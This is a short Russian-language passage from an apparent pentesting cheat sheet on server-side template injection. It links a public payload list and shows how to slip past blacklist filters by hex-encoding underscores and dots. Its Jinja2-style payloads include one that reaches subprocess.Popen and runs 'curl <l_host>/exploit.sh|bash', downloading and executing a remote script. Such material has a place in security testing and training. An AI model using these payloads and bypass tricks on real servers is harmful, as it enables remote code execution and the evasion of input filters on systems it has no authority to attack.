[Server Side Template Injection Payloads](https://github.com/payloadbox/ssti-payloads)
Payload выше можно изменять для обхода защиты чёрного списка. А именно:
**Замена "_" на “\\x5f” и "." на "\\x2E" или объединение строк массивов. Пример:** 
```
{{"".__class__}}  
{{""["\x5f\x5fclass\x5f\x5f"]}}
```
```
{{''.__class__.__mro__[1].__subclasses__()[287]}}  
{{""["\x5f\x5fclass\x5f\x5f"]["\x5f\x5fmro\x5f\x5f"][1]["\x5f\x5fsubclasses\x5f\x5f"]()[365]('curl <l_host>/exploit.sh|bash',shell=True,stdout=-1).communicate()}}
```
